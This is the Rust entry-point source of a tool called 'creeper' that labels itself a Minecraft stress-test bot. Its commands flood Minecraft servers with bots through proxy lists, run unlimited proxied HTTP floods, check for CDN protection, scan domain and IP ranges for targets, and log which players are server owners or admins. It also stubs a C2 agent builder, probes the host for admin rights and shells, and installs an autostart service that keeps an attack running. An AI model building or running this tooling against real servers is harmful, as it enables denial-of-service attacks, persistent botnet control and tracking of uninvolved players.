use std::path::PathBuf;

use clap::{Parser, Subcommand};
use config::Config;
use crate::attack::Creeper;

mod attack;
mod bot;
mod bot_connect;
mod c2core;
mod config;
mod discover;
mod entity_location;
mod factory;
mod http_flood;
mod logging;
mod motd;
mod options;
mod protocol;
mod scanner;
mod service;
mod sync;
mod tui;

#[derive(Parser)]
#[command(name = "creeper", version, about = "Minecraft stress-test bot")]
struct Cli {
    /// Path to config file
    #[arg(short = 'C', long)]
    config: Option<PathBuf>,

    #[command(subcommand)]
    command: Option<Commands>,
}

#[derive(Subcommand)]
enum Commands {
    /// Start attack with current config / CLI overrides
    #[command(visible_alias = "s")]
    Start {
        /// Server hostname
        #[arg(short, long)]
        host: Option<String>,

        /// Server port
        #[arg(short, long)]
        port: Option<u16>,

        /// Number of bots
        #[arg(short = 'c', long = "count")]
        amount: Option<usize>,

        /// Join delay (ms)
        #[arg(short = 'd', long = "delay")]
        delay: Option<u64>,

        /// Bot name format (Java %d syntax)
        #[arg(short = 'n', long = "name")]
        name_format: Option<String>,

        /// Minecraft version
        #[arg(short = 'v', long = "version")]
        version: Option<String>,

        /// Auto-register on join
        #[arg(short = 'r', long = "register")]
        auto_register: bool,

        /// Proxy list file (SOCKS5, one per line)
        #[arg(short = 'P', long = "proxies")]
        proxies: Option<String>,

        /// Nickname list file (one per line)
        #[arg(short = 'N', long = "nicks")]
        nicks: Option<String>,
    },

    /// Print or generate default config
    #[command(visible_alias = "c")]
    Config {
        /// Print current config
        #[arg(long)]
        show: bool,

        /// Print default config template
        #[arg(long)]
        default: bool,

        /// Open config file in $EDITOR
        #[arg(long)]
        edit: bool,
    },

    /// Print server info (MOTD, players, version)
    #[command(visible_alias = "i")]
    Info {
        /// Server hostname
        host: Option<String>,

        /// Server port
        #[arg(short, long, default_value_t = 25565)]
        port: u16,
    },

    /// Monitor server(s) — periodically ping and collect player names.
    /// Use --targets to monitor multiple servers from a JSON file.
    #[command(visible_alias = "m")]
    Monitor {
        /// Server hostname (single target mode)
        host: Option<String>,

        /// Server port (single target mode)
        #[arg(short, long, default_value_t = 25565)]
        port: u16,

        /// Ping interval in seconds (single target mode)
        #[arg(short = 't', long, default_value_t = 60)]
        interval: u64,

        /// Hub URL to sync journal to (e.g. http://printer:9090)
        #[arg(long)]
        sync: Option<String>,

        /// Path to targets JSON file for multi-target monitoring
        #[arg(long)]
        targets: Option<String>,
    },

    /// Discover MC servers by scanning domain patterns + port ranges.
    /// Example: creeper discover --domains "srv{}.example.com:1..50" --ports "25565,10000-10500"
    #[command(visible_alias = "d")]
    Discover {
        /// Domain patterns: "template:start..end", repeatable.
        /// e.g. --domains "srv{}.example.com:1..50"
        #[arg(short = 'D', long, required = true)]
        domains: Vec<String>,

        /// Ports to scan: comma-separated with ranges.
        /// e.g. --ports "25565,10000-10500,25000-26500"
        #[arg(short = 'p', long, default_value = "25565,10000-10500,25000-26500")]
        ports: String,

        /// Max concurrent probes
        #[arg(short = 'c', long, default_value_t = 50)]
        concurrency: usize,

        /// Output as JSON array (for mc-targets.json)
        #[arg(long)]
        json: bool,
    },

    /// Send HTTP/HTTPS flood (concurrent requests)
    #[command(visible_alias = "h")]
    Http {
        /// Target URL
        url: String,

        /// HTTP method (GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS)
        #[arg(short, long, default_value = "GET")]
        method: String,

        /// Number of concurrent connections
        #[arg(short = 'c', long, default_value_t = 50)]
        concurrency: usize,

        /// Total requests (0 = unlimited until Ctrl+C)
        #[arg(short = 'n', long, default_value_t = 0)]
        total: u64,

        /// Request body (for POST/PUT/PATCH)
        #[arg(short = 'b', long)]
        body: Option<String>,

        /// Delay between requests in ms
        #[arg(short = 'd', long, default_value_t = 0)]
        delay: u64,

        /// Custom header, can be repeated: -H "Key: Value"
        #[arg(short = 'H', long)]
        header: Vec<String>,

        /// Proxy URL (socks5://... or http://...), can be repeated
        #[arg(short = 'P', long)]
        proxy: Vec<String>,

        /// Request timeout in seconds
        #[arg(short = 't', long, default_value_t = 30)]
        timeout: u64,
    },

    /// Check if a domain is behind a CDN (Cloudflare, etc.)
    #[command(visible_alias = "ck")]
    Check {
        /// Domain name to check
        domain: String,
    },

    /// Query a Creeper Hub node for status and player journal.
    #[command(visible_alias = "hb")]
    Hub {
        /// Hub URL (e.g. http://printer:9090)
        #[arg(short = 'H', long, default_value = "http://127.0.0.1:9090")]
        hub: String,
    },

    /// Terminal UI dashboard (monitor + flood control)
    #[command(visible_alias = "t")]
    Tui {
        /// Server hostname to monitor
        host: Option<String>,

        /// Server port
        #[arg(short, long, default_value_t = 25565)]
        port: u16,

        /// Hub URL to pull journal from (e.g. http://printer:9090)
        #[arg(long)]
        remote: Option<String>,
    },

    /// Manage system service (install/start/stop/status)
    #[command(visible_alias = "sv")]
    Service {
        #[command(subcommand)]
        action: ServiceAction,
    },

    /// Start sync hub — serve journal API for other nodes
    #[command(visible_alias = "hub")]
    Serve {
        /// Listen host
        #[arg(long, default_value = "0.0.0.0")]
        host: String,

        /// Listen port
        #[arg(long, default_value_t = 9090)]
        port: u16,

        /// Display name for the target being monitored
        #[arg(long, default_value = "unknown")]
        target: String,
    },

    /// Show player journal (local or from a hub)
    #[command(visible_alias = "j")]
    Journal {
        /// Server hostname filter
        host: Option<String>,

        /// Server port
        #[arg(short, long, default_value_t = 25565)]
        port: u16,

        /// Hub URL to pull from (e.g. http://printer:9090)
        #[arg(long)]
        remote: Option<String>,
    },

    /// Show hub status
    Status {
        /// Hub URL (e.g. http://printer:9090)
        #[arg(long, default_value = "http://localhost:9090")]
        remote: String,
    },

    /// Annotate a player (set role/note)
    #[command(visible_alias = "a")]
    Annotate {
        /// Server hostname
        host: Option<String>,

        /// Server port
        #[arg(short, long, default_value_t = 25565)]
        port: u16,

        /// Player name
        player: String,

        /// Role: 服主 / 管理员 / 普通玩家 / 未知
        #[arg(long, default_value = "")]
        role: String,

        /// Free-text note
        #[arg(long, default_value = "")]
        note: String,
    },

    /// Build a portable C2 agent binary (educational use)
    #[command(visible_alias = "b")]
    Build {
        /// C2 server address(es) to hardcode into the agent
        #[arg(short = 'S', long = "server", required = true)]
        servers: Vec<String>,
    },

    /// Scan IPv4 range + ports with protocol detection (nmap-like)
    #[command(visible_alias = "sc")]
    Scan {
        /// Target IP(s): single (1.1.1.1), CIDR (1.1.1.0/24), or range (1.1.1.1~1.1.1.254)
        #[arg(short = 'T', long, required = true)]
        target: Vec<String>,

        /// Port(s): single (80), range (10000~50000), comma-separated
        #[arg(short, long, default_value = "22,80,443,3389,8080")]
        ports: String,

        /// Scan modes: tcp, udp, http, icmp, rdp, ssh (comma-separated)
        #[arg(short = 'm', long, default_value = "tcp")]
        modes: String,

        /// Concurrent tasks (default: 50)
        #[arg(short = 'c', long, default_value_t = 50)]
        concurrency: usize,
    },

    /// Probe local system info — OS, admin, available shells
    Probe,
}

#[derive(Subcommand)]
enum ServiceAction {
    /// Install autostart service (systemd / launchd / Windows Service)
    Install,
    /// Uninstall service
    Uninstall,
    /// Start the daemon (forks to background on Unix)
    Start,
    /// Stop the daemon
    Stop,
    /// Show service status
    Status,
    /// Run in foreground (used internally by service manager)
    Run,
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    logging::init();
    let cli = Cli::parse();

    match cli.command {
        Some(Commands::Config { show, default: print_def, edit }) => {
            if print_def {
                config::print_default();
                return Ok(());
            }
            let path = cli.config.clone().unwrap_or_else(|| Config::path().unwrap_or_default());
            if show {
                let cfg = Config::load_from(Some(&path)).unwrap_or_default();
                println!("{}", serde_json::to_string_pretty(&cfg).unwrap());
                return Ok(());
            }
            if edit {
                let p = if path.exists() { &path } else {
                    let cfg = Config::default();
                    cfg.save_to(&path)?;
                    &path
                };
                let editor = std::env::var("EDITOR")
                    .or_else(|_| std::env::var("VISUAL"))
                    .unwrap_or_else(|_| "vim".into());
                let status = std::process::Command::new(&editor).arg(p).status()?;
                if !status.success() {
                    anyhow::bail!("Editor exited with error");
                }
                let cfg = Config::load_from(Some(p))?;
                cfg.save_to(p)?;
                log::info!("Config saved to {}", p.display());
                return Ok(());
            }
            let p = cli.config.unwrap_or_else(|| Config::path().unwrap_or_default());
            println!("{}", p.display());
        }

        Some(Commands::Start { host, port, amount, delay, name_format, version,
                                auto_register, proxies, nicks }) => {
            let mut cfg = cli.config.as_deref()
                .and_then(|p| Config::load_from(Some(p)).ok())
                .unwrap_or_default();

            cfg.apply_cli_overrides(host, port, amount, delay, name_format, version, Some(auto_register));

            let proxies_vec: Vec<protocol::ProxyInfo> = if let Some(ref path) = proxies {
                load_proxies_file(path)?
            } else { vec![] };

            let nicks_vec: Vec<String> = if let Some(ref path) = nicks {
                let content = std::fs::read_to_string(path)?;
                content.lines().map(|l| l.trim().to_owned()).filter(|l| !l.is_empty()).collect()
            } else { vec![] };

            run_attack(cfg, proxies_vec, nicks_vec).await;
        }

        Some(Commands::Discover { domains, ports, concurrency, json }) => {
            let patterns: Vec<discover::DomainPattern> = domains
                .iter()
                .map(|d| discover::DomainPattern::parse(d))
                .collect::<Result<_, _>>()?;
            let ports = discover::parse_ports(&ports)?;

            log::info!(
                "Discover mode: {} pattern(s), {} port(s), concurrency={}",
                patterns.len(),
                ports.len(),
                concurrency,
            );

            let servers = discover::discover(&patterns, &ports, concurrency).await;

            if json {
                println!("{}", discover::to_targets_json(&servers));
            } else {
                discover::print_results(&servers);
            }
        }

        Some(Commands::Info { host, port }) => {
            let host = host.unwrap_or_else(|| "127.0.0.1".to_string());
            log::info!("Querying server info for {}:{} ...", host, port);

            // Try Java first, fallback to Bedrock (UDP/RakNet)
            let result = motd::ping(&host, port, -1, true);

            if result.info.motd.is_empty() {
                log::error!("Server unreachable on both Java (TCP) and Bedrock (UDP).");
                eprintln!("Server is offline or unreachable.");
                return Ok(());
            }

            motd::print_server_info(&result);
        }

        Some(Commands::Monitor { host, port, interval, sync: sync_url, targets }) => {
            // Multi-target mode: --targets <file>
            if let Some(ref targets_path) = targets {
                log::info!("Multi-target monitor mode: {}", targets_path);
                motd::monitor_all(targets_path, sync_url.as_deref()).await?;
                return Ok(());
            }

            // Single-target mode
            let host = host.unwrap_or_else(|| "127.0.0.1".to_string());
            let interval = std::time::Duration::from_secs(interval);

            log::info!("Starting monitor for {}:{} (every {}s)", host, port, interval.as_secs());
            if let Some(ref url) = sync_url {
                log::info!("Syncing journal to hub: {}", url);
            }

            // First query — show server info if reachable, otherwise let the loop retry
            let result = motd::ping(&host, port, -1, false);
            if result.info.motd.is_empty() {
                log::warn!("Server {}:{} is currently unreachable — monitor will retry", host, port);
                eprintln!("Server is offline or unreachable. Monitor will retry...");
            } else {
                motd::print_server_info(&result);
            }
            println!();
            log::info!("Monitoring — press Ctrl+C to stop and save journal");

            motd::monitor_sync(&host, port, -1, interval, sync_url.as_deref()).await?;
        }

        Some(Commands::Http { url, method, concurrency, total, body, delay, header, proxy, timeout }) => {
            let http_method = http_flood::HttpMethod::from_str(&method)
                .ok_or_else(|| anyhow::anyhow!("Invalid HTTP method: {}. Use GET, POST, PUT, DELETE, PATCH, HEAD, or OPTIONS", method))?;

            // Parse custom headers
            let headers: Vec<(String, String)> = header.iter()
                .filter_map(|h| {
                    h.split_once(':')
                        .map(|(k, v)| (k.trim().to_string(), v.trim().to_string()))
                })
                .collect();

            if headers.len() != header.len() {
                log::warn!("Some headers could not be parsed (format: -H 'Key: Value')");
            }

            let cfg = http_flood::HttpFloodConfig {
                url,
                method: http_method,
                concurrency,
                total,
                headers,
                body,
                delay_ms: delay,
                proxies: proxy,
                timeout_secs: timeout,
            };

            let snapshot = http_flood::start_flood(cfg).await;
            match snapshot {
                Ok(s) => http_flood::print_flood_summary(&s),
                Err(e) => log::error!("HTTP flood failed: {e}"),
            }
        }

        Some(Commands::Hub { hub }) => {
            sync::print_node_status(&hub).await;
        }

        Some(Commands::Check { domain }) => {
            let check = http_flood::check_cdn(&domain);
            http_flood::print_cdn_check(&check);
        }

        Some(Commands::Build { servers }) => {
            use std::net::ToSocketAddrs;
            println!("Building C2 agent for servers (ordered by priority):");
            for (i, addr) in servers.iter().enumerate() {
                let label = if i == 0 { "Primary" } else { "Fallback" };
                match addr.to_socket_addrs() {
                    Ok(_) => println!("  ✔ {}: {}", label, addr),
                    Err(e) => {
                        log::error!("Invalid server address '{}': {}", addr, e);
                        eprintln!("  ✘ {}: {} (unresolvable)", label, addr);
                        return Err(anyhow::anyhow!("Cannot resolve '{}'", addr));
                    }
                }
            }
            if servers.len() == 1 {
                println!("  └─ (no fallback servers)");
            }
            // TODO: actual payload generation
            log::warn!("Payload generation not yet implemented — this is a placeholder");
        }

        Some(Commands::Scan { target, ports, modes, concurrency }) => {
            // Parse target IPs
            let mut all_ips = Vec::new();
            for t in &target {
                match scanner::parse_ip_range(t) {
                    Ok(ips) => {
                        log::info!("Target {} → {} IP(s)", t, ips.len());
                        all_ips.extend(ips);
                    }
                    Err(e) => {
                        anyhow::bail!("Invalid target '{}': {}", t, e);
                    }
                }
            }
            if all_ips.is_empty() {
                anyhow::bail!("No valid targets");
            }

            // Parse ports
            let port_list = scanner::parse_ports(&ports)
                .map_err(|e| anyhow::anyhow!("Invalid ports '{}': {}", ports, e))?;

            // Parse modes
            let mode_list: Vec<String> = modes
                .split(',')
                .map(|s| s.trim().to_lowercase())
                .filter(|s| !s.is_empty())
                .collect();

            let valid_modes = ["tcp", "udp", "http", "icmp", "rdp", "ssh"];
            for m in &mode_list {
                if !valid_modes.contains(&m.as_str()) {
                    anyhow::bail!("Unknown scan mode '{}'. Valid: {}", m, valid_modes.join(", "));
                }
            }

            println!("┌─ Scan ─────────────────────────────────");
            println!("│ Targets : {} IP(s)", all_ips.len());
            println!("│ Ports   : {} port(s)", port_list.len());
            println!("│ Modes   : {}", mode_list.join(", "));
            println!("│ Workers : {concurrency}");
            println!("└────────────────────────────────────────");
            println!();

            let results = scanner::run_scan(all_ips, port_list, &mode_list, concurrency).await;
            scanner::print_results(&results);
        }

        Some(Commands::Probe) => {
            let info = c2core::collect_info();
            println!("┌─ System Probe ────────────────────────────");
            println!("│ OS       : {}", info.os_name);
            println!("│ Hostname : {}", info.hostname);
            println!("│ Admin    : {}", info.is_admin);
            println!("│ Shells   :");
            for sh in &info.available_shells {
                println!("│   [{:?}] {} ({}){}",
                    sh.shell_type, sh.path, sh.version,
                    if sh.is_default { " [default]" } else { "" }
                );
            }
            println!("└───────────────────────────────────────────");
        }

        Some(Commands::Serve { host, port, target }) => {
            sync::run_hub(&host, port, &target).await?;
        }

        Some(Commands::Journal { host, port, remote }) => {
            if let Some(ref hub_url) = remote {
                // Pull journal from hub — show all servers
                if let Some(j) = sync::pull_from_hub(hub_url).await {
                    if j.players.is_empty() {
                        println!("(empty journal)");
                    } else {
                        for (key, entries) in &j.players {
                            println!("┌─ Player Journal ────────────────────────────");
                            println!("│ Server  : {key}");
                            println!("│ Total   : {} entries", entries.len());
                            for entry in entries {
                                let role_tag = if entry.role == "未知" { "" } else { &format!(" [{}]", entry.role) };
                                println!("│ - {}{}", entry.name, role_tag);
                                if !entry.note.is_empty() {
                                    println!("│   Note: {}", entry.note);
                                }
                            }
                            println!("└──────────────────────────────────────────────");
                        }
                    }
                } else {
                    eprintln!("Failed to pull journal from {}", hub_url);
                }
            } else {
                // Local journal
                let host_str = host.clone().unwrap_or_else(|| "?".into());
                let journal = motd::PlayerJournal::load();
                journal.print_summary(&host_str, port);
            }
        }

        Some(Commands::Status { remote }) => {
            if let Some(status) = sync::pull_status(&remote).await {
                println!("{}", serde_json::to_string_pretty(&status).unwrap_or_default());
            } else {
                eprintln!("Failed to pull status from {}", remote);
            }
        }

        Some(Commands::Annotate { host, port, player, role, note }) => {
            let host = host.unwrap_or_else(|| "?".into());
            let mut journal = motd::PlayerJournal::load();
            journal.annotate(&host, port, &player, &role, &note);
            journal.save();
            journal.print_summary(&host, port);
        }

        Some(Commands::Tui { host: _, port: _, remote }) => {
            tui::run_tui(remote.as_deref()).await?;
        }

        Some(Commands::Service { action }) => {
            use service::daemon;
            let d = daemon();
            match action {
                ServiceAction::Install => {
                    d.install_service()?;
                    log::info!("creeper service installed");
                }
                ServiceAction::Uninstall => {
                    d.uninstall_service()?;
                    log::info!("creeper service uninstalled");
                }
                ServiceAction::Start => {
                    let cfg = Config::load();
                    let proxies = vec![];
                    let nicks = vec![];
                    d.start(false, || {
                        let rt = tokio::runtime::Builder::new_current_thread()
                            .enable_all().build().unwrap();
                        rt.block_on(run_attack(cfg, proxies, nicks));
                        Ok(())
                    })?;
                }
                ServiceAction::Stop => {
                    d.stop()?;
                }
                ServiceAction::Status => {
                    service::print_status(&d);
                }
                ServiceAction::Run => {
                    let cfg = Config::load();
                    let proxies = vec![];
                    let nicks = vec![];
                    // foreground mode — used by service manager (systemd/launchd/SCM)
                    d.start(true, || {
                        let rt = tokio::runtime::Builder::new_current_thread()
                            .enable_all().build().unwrap();
                        rt.block_on(run_attack(cfg, proxies, nicks));
                        Ok(())
                    })?;
                }
            }
        }

        None => {
            use clap::CommandFactory;
            Cli::command().print_help()?;
        }
    }

    Ok(())
}

fn load_proxies_file(path: &str) -> anyhow::Result<Vec<protocol::ProxyInfo>> {
    let content = std::fs::read_to_string(path)?;
    let mut proxies = vec![];
    for line in content.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') { continue; }
        // Accept bare host:port as socks5://host:port for convenience
        let url = if line.contains("://") { line.to_owned() } else { format!("socks5://{line}") };
        match protocol::ProxyInfo::parse(&url) {
            Ok(p) => proxies.push(p),
            Err(e) => log::warn!("Skipping proxy '{}': {}", line, e),
        }
    }
    Ok(proxies)
}

/// Start an attack from configuration (used by both `start` and `service run`).
async fn run_attack(cfg: Config, proxies: Vec<protocol::ProxyInfo>, nicks: Vec<String>) {
    let options = options::Options {
        hostname: cfg.target.host.clone(),
        port: cfg.target.port,
        amount: cfg.target.count,
        join_delay_ms: cfg.target.join_delay_ms,
        bot_name_format: cfg.bot.name_format.clone(),
        game_version: match protocol::GameVersion::find_by_name(&cfg.target.version) {
            Some(v) => v,
            None => { log::error!("Unsupported version: {}", cfg.target.version); return; }
        },
        auto_register: cfg.bot.auto_register,
        max_attempts: cfg.bot.max_attempts,
    };

    log::info!("Starting Creeper → {}:{} ({} bots, max_attempts={})",
        options.hostname, options.port, options.amount, options.max_attempts);

    // Optionally ping the server before attacking
    if cfg.server.ping_on_start {
        log::info!("Pinging server {}:{} before attack ...", options.hostname, options.port);
        match motd::ping_java(&options.hostname, options.port, options.game_version.protocol_version().unwrap_or(-1)) {
            Ok(info) => {
                log::info!("Server online — {} {} ({}/{})",
                    info.game_version, info.motd, info.players_online, info.players_max);
            }
            Err(e) => {
                log::warn!("Server ping failed: {e} — proceeding anyway");
            }
        }
    }

    let mut attack = Creeper::new();
    if !proxies.is_empty() { attack.set_proxies(proxies); }
    if !nicks.is_empty() { attack.set_names(nicks); }
    attack.start(options).await;
}
